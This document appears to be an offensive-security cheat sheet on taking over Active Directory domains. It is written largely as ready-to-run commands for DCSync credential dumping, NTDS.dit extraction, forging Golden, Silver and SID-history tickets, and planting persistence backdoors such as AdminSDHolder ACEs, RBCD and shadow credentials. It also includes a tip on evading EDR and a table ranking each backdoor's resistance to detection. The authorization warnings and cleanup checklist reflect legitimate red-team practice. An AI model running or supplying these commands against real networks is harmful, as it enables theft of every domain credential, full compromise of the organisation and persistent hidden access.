---
title: "Domain Dominance, DCSync & Persistence"
description: "DCSync, NTDS extraction, golden tickets, SID history injection, and Active Directory persistence mechanisms"
tags:
  - Active Directory
  - DCSync
  - Golden Ticket
  - Persistence
  - Domain Dominance
---

# Domain Dominance, DCSync & Persistence

!!! danger "Tier 0 Destructive Actions"
    Everything on this page is **destructive and heavily audited**. In client engagements, obtain explicit authorization before DCSync, SID History injection, or Golden Ticket creation, and document blast radius in advance.

---

## 1. DCSync (Replication Rights Abuse)

Any principal with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (Domain Admins, Enterprise Admins, or an ACL you abused) can replicate password hashes from the DC — **without touching it**.

```bash
# --- Dump a single high-value account ---
impacket-secretsdump '<DOMAIN>/<USER>:Password123!@<DC_IP>' -just-dc-user krbtgt
impacket-secretsdump '<DOMAIN>/<USER>:Password123!@<DC_IP>' -just-dc-user administrator
# --- Full domain dump (all NTLM hashes + Kerberos keys) ---
impacket-secretsdump -just-dc '<DOMAIN>/<USER>:Password123!@<DC_IP>' -outputfile dcsync_full
# --- With a hash / ticket instead of a password ---
impacket-secretsdump -just-dc-ntlm -hashes :<NTHASH> '<DOMAIN>/administrator@<DC_IP>'
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -just-dc -k -no-pass <DC_HOST>.<DOMAIN>
# --- Windows-side alternative ---
# mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
# .\SharpKatz.exe --Command dcsync --User <DOMAIN>\krbtgt --Domain <DOMAIN>
# .\nanodump.exe (LSASS dump) then parse offline with pypykatz
# --- Parse any LSASS dump offline ---
pypykatz lsa minidump lsass.dmp
```

---

## 2. NTDS.dit Extraction (Offline Domain Dump)

```bash
# --- Option A: Volume Shadow Copy (on the DC) ---
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
# Also copy SYSTEM and SECURITY hives (needed for decrypting the PEK)
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
# --- Option B: Remotely via Impacket (RPC) ---
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:Password123!@<DC_IP>' -use-vss
# --- Option C: Extract NTDS from a mounted VHDX/Disk (cloud/on-prem backups) ---
# Mount the virtual disk, copy NTDS.dit + SYSTEM hive, then parse offline:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile ad_ntds_dump
# --- Option D: DiskShadow (native Windows utility that bypasses some EDR monitors) ---
diskshadow /s script.txt # script.txt contains exec/copy commands
```

---

## 3. Golden Ticket, Silver Ticket & Diamond Ticket

| Ticket | Signed With | Scope | Notes |
| :--- | :--- | :--- | :--- |
| **Golden** | `krbtgt` NTLM hash / AES key | **Entire domain**, any user, any service | Valid up to 10 years. Requires krbtgt hash (DCSync). |
| **Silver** | Service account hash | One **service** on one host | No DC contact. Requires the target SPN + its service hash. |
| **Diamond** | Real TGT, modified PAC | Domain | Modify a legitimate TGT (stealthier than Golden — less anomalous). |
| **Sapphire** | Golden + PAC for another domain | Forest / trust | Requires trust key + SID of the target domain. |

```bash
# --- Golden Ticket: forge a TGT signed with krbtgt's hash ---
impacket-ticketer -nthash <KRBTGT_NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
    -groups 502,512,519,518 -user-id 500 administrator
export KRB5CCNAME=administrator.ccache
nxc smb <DC_IP> -k --use-kcache --shares
impacket-secretsdump -k -no-pass -just-dc <DC_HOST>.<DOMAIN>
# --- Golden Ticket with AES256 (when RC4 is disabled / detected) ---
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> administrator
# --- Silver Ticket: forge a TGS for a specific SPN ---
impacket-ticketer -nthash <SVC_NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
    -spn cifs/<TARGET_HOST>.<DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache && impacket-wmiexec -k -no-pass <TARGET_HOST>.<DOMAIN>
# --- Windows: Mimikatz Golden Ticket ---
# kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt
# kerberos::golden /... /aes256:<KEY> /startoffset:0 /endin:600 /renewmax:10080 /ptt
# misc::cmd (opens a SYSTEM/DA cmd in the same logon session)
```

---

## 4. SID History & Forest Trust Attacks

```bash
# --- Cross-domain: inject Enterprise Admins (SID 519) into a child-domain ticket ---
impacket-ticketer -nthash <CHILD_KRBTGT_HASH> -domain-sid <CHILD_DOMAIN_SID> \
    -domain <CHILD_DOMAIN> -extra-sid <ROOT_DOMAIN_SID>-519 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc <ROOT_DC_HOST>.<ROOT_DOMAIN>
# --- Golden GMSA (Group Managed Service Account takeover) ---
# Requires: gMSA's msDS-ManagedPasswordId + KDS root key access via
# CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration
python3 goldenGMSA.py -u '<USER>' -d <DOMAIN> -p 'Password123!' -s <DOMAIN_SID> -dc <DC_IP>
# --- Foreign group membership abuse (trust direction matters!) ---
nxc ldap <DC_IP> -u '<USER>' -p 'Password123!' --query "(objectClass=foreignSecurityPrincipal)" "cn"
bloodyAD --host <DC_IP> -d <DOMAIN> -u '<USER>' -p 'Password123!' get object \
    --attr member --base "CN=Enterprise Admins,CN=Users,DC=corp,DC=local"
# --- SID Filtering check: does the trust enforce SIDFilteringEnabled? ---
# If disabled -> cross-trust SID injection is possible (extremely high impact)
netdom trust <CHILD_DOMAIN> /domain:<ROOT_DOMAIN> /quarantine # On Windows
```

---

## 5. Persistence Mechanisms

!!! warning "Authorized Red Team / Purple Team Use Only"
    Persistence should only be deployed with explicit written scope. Always document and remove persistence before the end of the engagement.

| Mechanism | Description | Detection Resistance |
| :--- | :--- | :--- |
| **Golden Ticket** | Forged TGT signed by krbtgt — survives reboots and password changes | High (until **krbtgt is rotated twice**) |
| **SID History injection** | Add a privileged SID to a controlled account | High — persists across group changes |
| **AdminSDHolder + SDProp** | Write an ACE on `AdminSDHolder`; SDProp copies it to all protected objects every 60 min | High — re-applies automatically |
| **Shadow Credentials (`msDS-KeyCredentialLink`)** | Add a key credential to a machine/DA account → PKINIT anytime | High, low-noise |
| **DCShadow (needs DA)** | Register a rogue DC → push arbitrary changes into AD replication | Very high — legitimate replication traffic |
| **Machine account ACL backdoor** | Grant yourself `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) on a server | High — requires cleanup |
| **Scheduled Task / Service / Registry Run** | Local persistence on a compromised host | Low — very noisy, detected immediately |
| **DCSync rights granted to a normal user** | Add replication rights via WriteDacl | Medium — often missed by periodic audits |
| **krbtgt password rotation avoidance** | If krbtgt is never rotated, Golden Tickets never expire | Detect via `4724`/`4738` audit of krbtgt changes |

```bash
# --- AdminSDHolder persistence ---
impacket-dacledit -action write -rights FullControl -principal '<USER>' \
    -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    '<DOMAIN>/<USER>:Password123!' -dc-ip <DC_IP>
# Wait for SDProp (~60 min) OR force it:
# PowerShell> Invoke-ADSDPropagation (or: Set-ADObject on adminCount)
# --- Delegation backdoor on a machine (persistence + lateral movement) ---
impacket-rbcd -delegate-from 'PWNED$' -delegate-to 'FILESERVER$' -action write -dc-ip <DC_IP> '<DOMAIN>/<USER>:Password123!'
# --- Shadow credentials persistence on a DA account ---
certipy-ad shadow add -u '<USER>@<DOMAIN>' -p 'Password123!' -account 'DomainAdmin2' -dc-ip <DC_IP>
# --- Cleanup checklist (always run before leaving) ---
# - Remove any RBCD / ACEs / KeyCredentials you added
# - Delete machine accounts you created (PWNED$)
# - Remove scheduled tasks, services, and dropped binaries
# - Notify the client if krbtgt rotation is required
```

---

## 6. Trust & Cross-Forest Escalation Summary

```text
Parent <-> Child (two-way, implicit) -> SID history injection (Enterprise Admins 519)
Forest <-> Forest (trust) -> If SIDFiltering disabled: SID history / Kerberoast across
                                          -> Else: look for shared service accounts & foreign group members
Azure AD / Entra Connect (hybrid) -> Sync account (MSOL_) DCSync-equivalent rights on AD!
                                          -> Admin on the AD (via ADSync account) -> create cloud admin
                                          -> Password Hash Sync: reset AD password => reset Entra password
ADFS -> Golden SAML (needs ADFS service account hash + cert)
```

!!! tip "Hybrid Identity: The #1 Real-World Attack Path in 2026"
    In hybrid environments, compromising the **Entra Connect (Azure AD Connect) service account** (`MSOL_<hash>`) grants `Replicating Directory Changes` on the on-prem domain — a one-hop path from cloud to **on-prem Domain Admin**. Conversely, on-prem AD compromise with ADFS = **Golden SAML** = cloud tenant compromise. Always map both directions.